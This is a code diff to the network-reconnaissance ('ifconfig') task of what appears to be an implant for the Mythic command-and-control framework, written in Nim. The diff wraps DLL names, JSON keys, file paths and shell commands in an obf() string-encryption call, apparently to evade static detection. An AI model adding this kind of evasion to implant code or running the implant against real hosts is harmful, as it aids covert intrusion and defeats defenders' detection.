@@ -1,5 +1,6 @@
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import std/[json, strformat, strutils, osproc]
 
 when defined(windows):
@@ -99,12 +100,12 @@ when defined(windows):
   proc GetAdaptersAddresses(Family: ULONG, Flags: ULONG, Reserved: pointer,
                            AdapterAddresses: ptr IP_ADAPTER_ADDRESSES,
                            SizePointer: ptr ULONG): ULONG 
-    {.importc, dynlib: "iphlpapi.dll", stdcall.}
+    {.importc, dynlib: obf("iphlpapi.dll"), stdcall.}
   
   proc WSAAddressToStringA(lpsaAddress: pointer, dwAddressLength: DWORD,
                           lpProtocolInfo: pointer, lpszAddressString: ptr byte,
                           lpdwAddressStringLength: ptr DWORD): int32
-    {.importc, dynlib: "ws2_32.dll", stdcall.}
+    {.importc, dynlib: obf("ws2_32.dll"), stdcall.}
   
   proc sockaddrToString(sockaddr: pointer): string =
     ## Convert a sockaddr to an IP address string using Windows API
@@ -133,7 +134,7 @@ when defined(windows):
     else:
       return ""
 
-when defined(posix):
+when defined(linux):
   import std/[os, strutils, tables]
   
   proc readFile(path: string): string =
@@ -170,7 +171,7 @@ proc ifconfig*(taskId: string, params: JsonNode): JsonNode =
                                        nil, adapterAddresses, addr bufferSize)
       
       if result != 0:
-        return mythicError(taskId, &"GetAdaptersAddresses failed with error code: {result}")
+        return mythicError(taskId, obf("GetAdaptersAddresses failed with error code: ") & $result)
       
       # Iterate through adapters
       var currentAdapter = adapterAddresses
@@ -220,59 +221,59 @@ proc ifconfig*(taskId: string, params: JsonNode): JsonNode =
         let dnsSuffix = $cast[WideCString](adapter.DnsSuffix)
         
         var iface = %*{
-          "description": description,
-          "adapter_name": adapterName,
-          "adapter_id": adapterId,
-          "status": status,
-          "addresses_v4": addressesV4,
-          "addresses_v6": addressesV6,
-          "dns_servers": dnsServers,
-          "gateways": gateways,
-          "dhcp_addresses": newJArray(),
-          "dns_enabled": not adapter.FirstDnsServerAddress.isNil,
-          "dns_suffix": dnsSuffix,
-          "dynamic_dns_enabled": false
+          obf("description"): description,
+          obf("adapter_name"): adapterName,
+          obf("adapter_id"): adapterId,
+          obf("status"): status,
+          obf("addresses_v4"): addressesV4,
+          obf("addresses_v6"): addressesV6,
+          obf("dns_servers"): dnsServers,
+          obf("gateways"): gateways,
+          obf("dhcp_addresses"): newJArray(),
+          obf("dns_enabled"): not adapter.FirstDnsServerAddress.isNil,
+          obf("dns_suffix"): dnsSuffix,
+          obf("dynamic_dns_enabled"): false
         }
         
         interfaces.add(iface)
         currentAdapter = adapter.Next
     
-    when defined(posix):
+    when defined(linux):
       # Read network interfaces from /sys/class/net/
       var interfaceMap = initTable[string, JsonNode]()
       
-      for kind, path in walkDir("/sys/class/net"):
+      for kind, path in walkDir(obf("/sys/class/net")):
         if kind == pcDir or kind == pcLinkToDir:
           let name = path.splitPath().tail
           
           # Get MAC address
-          let macPath = &"/sys/class/net/{name}/address"
+          let macPath = obf("/sys/class/net") / name / obf("address")
           let adapterId = readFile(macPath).strip()
           
           # Get status
-          let statusPath = &"/sys/class/net/{name}/operstate"
+          let statusPath = obf("/sys/class/net") / name / obf("operstate")
           let status = readFile(statusPath).strip()
           
           var iface = %*{
-            "description": name,
-            "adapter_name": name,
-            "adapter_id": adapterId,
-            "status": status,
-            "addresses_v4": newJArray(),
-            "addresses_v6": newJArray(),
-            "dns_servers": newJArray(),
-            "gateways": newJArray(),
-            "dhcp_addresses": newJArray(),
-            "dns_enabled": false,
-            "dns_suffix": "",
-            "dynamic_dns_enabled": false
+            obf("description"): name,
+            obf("adapter_name"): name,
+            obf("adapter_id"): adapterId,
+            obf("status"): status,
+            obf("addresses_v4"): newJArray(),
+            obf("addresses_v6"): newJArray(),
+            obf("dns_servers"): newJArray(),
+            obf("gateways"): newJArray(),
+            obf("dhcp_addresses"): newJArray(),
+            obf("dns_enabled"): false,
+            obf("dns_suffix"): "",
+            obf("dynamic_dns_enabled"): false
           }
           
           interfaceMap[name] = iface
       
       # Get IP addresses from ip command
       try:
-        let ipOutput = readFile("/proc/net/fib_trie")
+        let ipOutput = readFile(obf("/proc/net/fib_trie"))
         # Parse interface addresses - this is complex, use ip addr as fallback
         discard
       except:
@@ -281,7 +282,7 @@ proc ifconfig*(taskId: string, params: JsonNode): JsonNode =
       # Try to get addresses using getifaddrs-like approach via /proc/net/if_inet6 and ip command
       # Read IPv4 addresses
       try:
-        let (output, exitCode) = execCmdEx("ip -4 addr show")
+        let (output, exitCode) = execCmdEx(obf("ip -4 addr show"))
         if exitCode == 0:
           var currentIface = ""
           for line in output.splitLines():
@@ -291,17 +292,17 @@ proc ifconfig*(taskId: string, params: JsonNode): JsonNode =
               let parts = line.split()
               if parts.len > 1:
                 currentIface = parts[1].strip(chars = {':'})
-            elif trimmed.startsWith("inet "):
+            elif trimmed.startsWith(obf("inet ")):
               let parts = trimmed.split()
               if parts.len > 1 and interfaceMap.hasKey(currentIface):
                 let ipAddr = parts[1].split('/')[0]
-                interfaceMap[currentIface]["addresses_v4"].add(%ipAddr)
+                interfaceMap[currentIface][obf("addresses_v4")].add(%ipAddr)
       except:
         discard
       
       # Read IPv6 addresses
       try:
-        let (output, exitCode) = execCmdEx("ip -6 addr show")
+        let (output, exitCode) = execCmdEx(obf("ip -6 addr show"))
         if exitCode == 0:
           var currentIface = ""
           for line in output.splitLines():
@@ -310,31 +311,31 @@ proc ifconfig*(taskId: string, params: JsonNode): JsonNode =
               let parts = line.split()
               if parts.len > 1:
                 currentIface = parts[1].strip(chars = {':'})
-            elif trimmed.startsWith("inet6 "):
+            elif trimmed.startsWith(obf("inet6 ")):
               let parts = trimmed.split()
               if parts.len > 1 and interfaceMap.hasKey(currentIface):
                 let ipAddr = parts[1].split('/')[0]
-                if not ipAddr.startsWith("fe80"):  # Skip link-local unless needed
-                  interfaceMap[currentIface]["addresses_v6"].add(%ipAddr)
+                if not ipAddr.startsWith(obf("fe80")):  # Skip link-local unless needed
+                  interfaceMap[currentIface][obf("addresses_v6")].add(%ipAddr)
       except:
         discard
       
       # Read DNS servers from /etc/resolv.conf
-      let resolvConf = readFile("/etc/resolv.conf")
+      let resolvConf = readFile(obf("/etc/resolv.conf"))
       var dnsServers = newJArray()
       for line in resolvConf.splitLines():
         let trimmed = line.strip()
-        if trimmed.startsWith("nameserver"):
+        if trimmed.startsWith(obf("nameserver")):
           let parts = trimmed.split()
           if parts.len > 1:
             dnsServers.add(%parts[1])
       
       # Read default gateway from /proc/net/route
       var defaultGateway = ""
-      let routeTable = readFile("/proc/net/route")
+      let routeTable = readFile(obf("/proc/net/route"))
       for line in routeTable.splitLines():
         let parts = line.split('\t')
-        if parts.len > 2 and parts[1] == "00000000":  # Destination 0.0.0.0 = default route
+        if parts.len > 2 and parts[1] == obf("00000000"):  # Destination 0.0.0.0 = default route
           # Gateway is in hex format (little-endian), convert to IP
           let gatewayHex = parts[2]
           if gatewayHex.len == 8:
@@ -350,10 +351,10 @@ proc ifconfig*(taskId: string, params: JsonNode): JsonNode =
       
       # Add DNS and gateway info to all interfaces
       for name, iface in interfaceMap:
-        iface["dns_servers"] = dnsServers
-        iface["dns_enabled"] = %(dnsServers.len > 0)
+        iface[obf("dns_servers")] = dnsServers
+        iface[obf("dns_enabled")] = %(dnsServers.len > 0)
         if defaultGateway.len > 0:
-          iface["gateways"].add(%defaultGateway)
+          iface[obf("gateways")].add(%defaultGateway)
         interfaces.add(iface)
     
     debug &"[DEBUG] Ifconfig: Found {interfaces.len} network interfaces"
@@ -362,4 +363,4 @@ proc ifconfig*(taskId: string, params: JsonNode): JsonNode =
     return mythicSuccess(taskId, output)
     
   except Exception as e:
-    return mythicError(taskId, &"Ifconfig error: {e.msg}")
+    return mythicError(taskId, obf("Ifconfig task failed: ") & e.msg)
